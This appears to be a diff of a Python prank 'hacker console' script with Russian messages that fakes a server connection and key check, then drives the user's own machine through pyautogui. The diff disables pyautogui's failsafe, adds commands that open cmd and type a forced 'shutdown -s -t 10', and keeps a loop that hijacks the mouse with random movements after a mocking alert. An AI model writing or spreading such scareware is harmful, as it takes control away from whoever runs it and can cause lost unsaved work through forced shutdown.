@@ -2,6 +2,7 @@ from termcolor import colored, cprint
 import time
 import pyautogui
 from random import randint
+pyautogui.FAILSAFE=False
 A=0
 B=0
 C=0
@@ -126,7 +127,7 @@ while(D!=123):
                 for step in range(100):
                     print(colored("                                                          ", 'green', 'on_black'))
                 time.sleep(0.3)
-                for step in range(15):
+                for step in range(5):
                     for step in range(100):
                         print(colored("Ожидание ответа сервера  |                 ", 'green', 'on_black'))
                     for step in range(100):
@@ -152,6 +153,8 @@ while(D!=123):
                 pyautogui.write('color 2')
                 pyautogui.press('enter')
                 pyautogui.press('f11')
+                pyautogui.write('shutdown -s -t 10 -c "HackConsole!"')
+                pyautogui.press('enter')
             else:
                 print(colored("Не правильный ключ!                                       ", 'green', 'on_black'))
                 print(colored("Попробуйте ещё раз или введите                            ", 'green', 'on_black'))
@@ -196,7 +199,7 @@ while(D!=123):
                         for step in range(100):
                             print(colored("                                                          ", 'green', 'on_black'))
                         time.sleep(0.3)
-                        for step in range(15):
+                        for step in range(5):
                             for step in range(100):
                                 print(colored("Ожидание ответа сервера  |                 ", 'green', 'on_black'))
                             for step in range(100):
@@ -206,7 +209,7 @@ while(D!=123):
                             for step in range(100):
                                 print(colored("Ожидание ответа сервера  \                 ", 'green', 'on_black'))
                         pyautogui.hotkey('win', 'r')
-                        pyautogui.write('cmd')
+                        pyautogui.write('cmd')   
                         pyautogui.press('enter')
                         time.sleep(0.1)
                         pyautogui.write('color 2')
@@ -222,6 +225,8 @@ while(D!=123):
                         pyautogui.write('color 2')
                         pyautogui.press('enter')
                         pyautogui.press('f11')
+                        pyautogui.write('shutdown -s -t 10 -c "HackConsole!"')
+                        pyautogui.press('enter')
                     else:
                         print(colored("Не правильный ключ!                                       ", 'green', 'on_black'))
                         print(colored("Попробуйте ещё раз или введите                            ", 'green', 'on_black'))
@@ -231,8 +236,8 @@ while(D!=123):
                 print(colored("Вы ввели не правильный ключ слишком много раз,            ", 'green', 'on_black'))
                 print(colored("ваше устройство будет заблокировано!!!                    ", 'green', 'on_black'))
                 pyautogui.alert(text="поживи как ни будь без мышки хахахха -__-, не ну а чё?", title="Hacker", button='OK')
-                while(True):
-                    pyautogui.moveTo(randint(0, 2000),randint(0,1000))
+                for step in range(10000):
+                    pyautogui.moveTo(randint(0, 1000),randint(0,1000))
                     
                     
                 
